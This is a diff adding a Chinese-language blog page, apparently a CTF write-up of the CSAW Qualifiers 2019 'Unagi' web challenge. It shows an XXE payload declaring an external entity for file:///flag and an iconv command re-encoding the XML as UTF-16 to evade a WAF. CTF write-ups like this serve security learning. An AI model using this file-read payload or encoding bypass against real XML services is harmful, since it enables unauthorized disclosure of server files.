@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>[CSAWQual 2019]Web_Unagi | Rock&#39;s blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="[CSAWQual 2019]Web_Unagi首先梳理程序功能逻辑  主页 用户信息 文件上传 flag位置提示  首先想到考察文件上传  程序要求上传符合要求的xml文件，然后解析成用户信息 123456789101112131415161718&lt;?xml version&#x3D;&amp;#x27;1.0&amp;#x27;?&gt;&lt;users&gt;    &lt;user&gt;        &amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[CSAWQual 2019]Web_Unagi">
+<meta property="og:url" content="https://rock718.github.io.git/2022/02/13/CSAWQual-2019-Web-Unagi/index.html">
+<meta property="og:site_name" content="Rock&#39;s blog">
+<meta property="og:description" content="[CSAWQual 2019]Web_Unagi首先梳理程序功能逻辑  主页 用户信息 文件上传 flag位置提示  首先想到考察文件上传  程序要求上传符合要求的xml文件，然后解析成用户信息 123456789101112131415161718&lt;?xml version&#x3D;&amp;#x27;1.0&amp;#x27;?&gt;&lt;users&gt;    &lt;user&gt;        &amp;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://rock718.github.io.git/CSAWQual-2019-Web-Unagi/image-20220213153150639.png">
+<meta property="og:image" content="https://rock718.github.io.git/CSAWQual-2019-Web-Unagi/image-20220213153934807.png">
+<meta property="og:image" content="https://rock718.github.io.git/CSAWQual-2019-Web-Unagi/image-20220213162817547.png">
+<meta property="article:published_time" content="2022-02-13T08:39:40.000Z">
+<meta property="article:modified_time" content="2022-02-13T14:45:36.000Z">
+<meta property="article:author" content="Rock">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="writeup">
+<meta property="article:tag" content="XXE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://rock718.github.io.git/CSAWQual-2019-Web-Unagi/image-20220213153150639.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Rock&#39;s blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link href="https://fonts.googleapis.com/css?family=Noto+Sans+KR:100,300,400,700&amp;subset=korean" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <!--<div id="banner"></div>-->
+  <div id="header-outer" class="outer">
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        <a href="/" id="main-nav-title" class="main-nav-link">Rock&#39;s blog</a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives/">Archives</a>
+        
+          <a class="main-nav-link" href="/about/">about</a>
+        
+      </nav>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-CSAWQual-2019-Web-Unagi" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      [CSAWQual 2019]Web_Unagi
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="CSAWQual-2019-Web-Unagi"><a href="#CSAWQual-2019-Web-Unagi" class="headerlink" title="[CSAWQual 2019]Web_Unagi"></a>[CSAWQual 2019]Web_Unagi</h2><p>首先梳理程序功能逻辑</p>
+<ul>
+<li>主页</li>
+<li>用户信息</li>
+<li>文件上传</li>
+<li>flag位置提示</li>
+</ul>
+<p>首先想到考察文件上传</p>
+<p><img src="/CSAWQual-2019-Web-Unagi/image-20220213153150639.png" alt="image-20220213153150639"></p>
+<p>程序要求上传符合要求的xml文件，然后解析成用户信息</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">users</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">username</span>&gt;</span>test<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>test<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>test<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">email</span>&gt;</span>test@fakesite.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">group</span>&gt;</span>CSAW2019<span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">username</span>&gt;</span>bob<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>passwd2<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span> Bob<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">email</span>&gt;</span>bob@fakesite.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">group</span>&gt;</span>CSAW2019<span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">users</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/CSAWQual-2019-Web-Unagi/image-20220213153934807.png" alt="image-20220213153934807"></p>
+<p>此时判断可能不是文件上传，大概率是XXE</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/9302528.html">https://www.cnblogs.com/backlion/p/9302528.html</a></p>
+<p>尝试通过外部实体声明读取<code>/flag</code></p>
+<p>直接插入提示被WAF拦截</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY b <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>尝试多次，感觉像是禁用了<code>ENTITY</code>，看看有没有源码</p>
+<p>扫描了一下没有发现</p>
+<p>再尝试文件上传</p>
+<p>也没成功</p>
+<p>查看wp <a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/105337784">https://blog.csdn.net/mochu7777777/article/details/105337784</a></p>
+<p>可以通过utf-16编码绕过WAF</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iconv -f utf8 -t utf16 1.xml&gt;2.xml</span><br></pre></td></tr></table></figure>
+
+<p><img src="/CSAWQual-2019-Web-Unagi/image-20220213162817547.png" alt="image-20220213162817547"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://rock718.github.io.git/2022/02/13/CSAWQual-2019-Web-Unagi/" data-id="cl9y4cx9h000y24fy1p3lah85" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XXE/" rel="tag">XXE</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/02/15/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" id="article-nav-newer" class="article-nav-link-wrap">
+      <span class="article-nav-caption">Newer</span>
+      <div class="article-nav-title">
+        
+          [安洵杯 2019]不是文件上传
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/05/17/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web5-CyberPunk-wp/" id="article-nav-older" class="article-nav-link-wrap">
+      <span class="article-nav-caption">Older</span>
+      <div class="article-nav-title">[CISCN2019 华北赛区 Day1 Web5]CyberPunk wp</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 Rock<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> with 
+      theme_by <a href="http://hexo.io/" target="_blank">mango</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives/" class="mobile-nav-link">Archives</a>
+  
+    <a href="/about/" class="mobile-nav-link">about</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
